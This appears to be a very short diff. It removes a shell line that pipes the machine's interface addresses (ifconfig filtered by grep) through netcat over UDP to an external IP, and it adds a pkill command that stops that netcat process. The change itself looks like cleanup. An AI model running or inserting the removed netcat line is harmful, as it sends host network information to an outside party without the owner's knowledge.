@@ -1,2 +1,1 @@
-ifconfig | grep inet | nc 100.64.4.84 1024 -u
-
+pkill -f "nc 100.64.4.84 1024 -u"
